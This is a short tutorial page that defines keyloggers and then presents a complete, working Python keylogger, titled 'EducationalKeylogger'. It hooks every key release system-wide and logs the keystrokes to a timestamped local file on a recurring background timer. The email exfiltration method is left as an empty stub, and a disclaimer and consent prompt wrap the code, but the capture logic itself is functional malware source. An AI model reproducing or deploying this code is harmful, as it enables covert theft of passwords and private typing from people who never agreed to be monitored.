### What is a Keylogger?

A keylogger is surveillance software or hardware that records keystrokes on a computer. They can be:

- **Software-based** (programs running on the target system)

- **Hardware-based** (physical devices connected to keyboards)

---------

### Keylogger Example :


```
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import os

class EducationalKeylogger:
    def __init__(self, interval=60, report_method="file"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.filename = f"keylog_{self.start_dt.strftime('%Y%m%d_%H%M%S')}.txt"
        
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name
    
    def report_to_file(self):
        if self.log:
            with open(self.filename, "a", encoding="utf-8") as f:
                print(f"{datetime.now()} - {self.log}", file=f)
            self.log = ""
    
    def send_email(self, email, password, message):
        # This would require proper email configuration
        # Removed for security reasons - never hardcode credentials
        pass
    
    def report(self):
        if self.report_method == "file":
            self.report_to_file()
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{self.filename} started")
        keyboard.wait()

# DISCLAIMER AND USAGE WARNING
if __name__ == "__main__":
    print("""
    ⚠️  EDUCATIONAL KEYLOGGER DEMONSTRATION ⚠️
    
    THIS IS FOR EDUCATIONAL PURPOSES ONLY!
    
    LEGAL WARNINGS:
    - Only use on systems you own
    - Never deploy without explicit written consent
    - Unauthorized use is illegal and unethical
    - This demonstration logs to a local file only
    
    This code demonstrates how keyloggers work for
    cybersecurity education and defensive purposes.
    """)
    
    consent = input("Do you understand and accept responsibility? (yes/no): ")
    if consent.lower() == 'yes':
        keylogger = EducationalKeylogger(interval=10, report_method="file")
        keylogger.start()
    else:
        print("Program terminated. Responsible use is required.")
```

